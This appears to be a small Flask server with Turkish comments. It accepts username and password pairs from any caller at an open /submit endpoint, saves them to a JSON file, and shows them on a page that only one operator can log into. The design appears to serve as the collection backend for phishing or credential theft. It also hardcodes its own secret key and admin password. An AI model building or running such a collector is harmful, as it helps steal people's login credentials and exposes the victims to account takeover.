from flask import Flask, request, jsonify, render_template, redirect, url_for, session
import json
from pathlib import Path
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = "beybaba1414"  # Bunu kendine özel yap, gizli bir anahtar

DATA_FILE = Path("data.json")

# Kullanıcı adı ve şifre (sadece senin gireceğin)
USERNAME = "goblin"  # kendi kullanıcı adını yaz
PASSWORD_HASH = generate_password_hash("beybababeybaba")  # kendi şifreni buraya hashle

# /submit endpoint'i
@app.route("/submit", methods=["POST"])
def submit():
    data = request.json
    if not data or "username" not in data or "password" not in data:
        return {"status": "error", "msg": "Geçersiz veri"}, 400

    # Mevcut verileri oku
    if DATA_FILE.exists():
        messages = json.loads(DATA_FILE.read_text())
    else:
        messages = []

    messages.append(data)
    DATA_FILE.write_text(json.dumps(messages, indent=2))
    return {"status": "ok"}

# Login sayfası
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        if username == USERNAME and check_password_hash(PASSWORD_HASH, password):
            session["logged_in"] = True
            return redirect(url_for("view"))
        else:
            return "Hatalı giriş!", 401
    return render_template("login.html")

# Verileri görüntüleme
@app.route("/view")
def view():
    if not session.get("logged_in"):
        return redirect(url_for("login"))

    if DATA_FILE.exists():
        messages = json.loads(DATA_FILE.read_text())
    else:
        messages = []

    return render_template("view.html", messages=messages)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
